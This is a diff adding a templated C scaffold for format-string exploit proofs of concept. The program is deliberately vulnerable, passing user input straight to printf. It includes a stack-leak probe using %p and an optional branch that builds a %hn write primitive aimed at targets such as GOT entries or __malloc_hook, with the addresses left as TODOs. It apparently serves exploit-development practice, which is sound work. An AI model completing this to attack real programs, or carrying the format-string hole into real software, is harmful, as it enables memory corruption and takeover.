@@ -1,0 +1,52 @@
+/*
+ * Format-string PoC scaffold — {{arch}}
+ * vuln: {{vuln}}
+ *
+ * Build:
+ *   {{#if asan}}cc -g -O0 -fsanitize=address -o fmt fmt.c{{else}}cc -g -O0 -o fmt fmt.c{{/if}}
+ *
+ * Primitive: attacker controls the format string passed to a printf-family
+ * function. `%n` gives a write; `%p`/`%s` give reads/leaks. Find your argument
+ * position with the `%N$p` probe below.
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+/* TODO: replace with the real sink (e.g. syslog(prio, user_str)). */
+static void vulnerable(const char *user) {
+    printf(user);          /* user-controlled format string */
+    printf("\n");
+}
+
+int main(int argc, char **argv) {
+    if (argc > 1 && strcmp(argv[1], "--probe") == 0) {
+        /* Leak the stack to locate your controlled buffer / target arg index. */
+        vulnerable("AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p");
+        return 0;
+    }
+
+    /* ARG_TODO: argument index where your input lands (from --probe). */
+    int arg = 6;
+
+    /* TARGET_TODO: address to overwrite (GOT entry, return addr, __malloc_hook). */
+    unsigned long target = 0x0;
+
+    char fmt[256];
+{{#if unsafe}}
+    /* Build a %n write of VALUE_TODO into `target`. For a full 8-byte write use
+     * staged %hn writes; precompute width per byte. This is the scaffold — fill
+     * VALUE_TODO and split into byte-writes for the real overwrite. */
+    snprintf(fmt, sizeof(fmt),
+             "%%%dc%%%d$hn", /* width then write to the arg holding &target */
+             0x4141 /* WIDTH_TODO */, arg);
+    (void)target;
+{{else}}
+    /* Read-only demo: leak the value at the target arg index. Pass --unsafe to
+     * build a %n write primitive. */
+    snprintf(fmt, sizeof(fmt), "leak=%%%d$p", arg);
+    (void)target;
+{{/if}}
+    vulnerable(fmt);
+    return 0;
+}
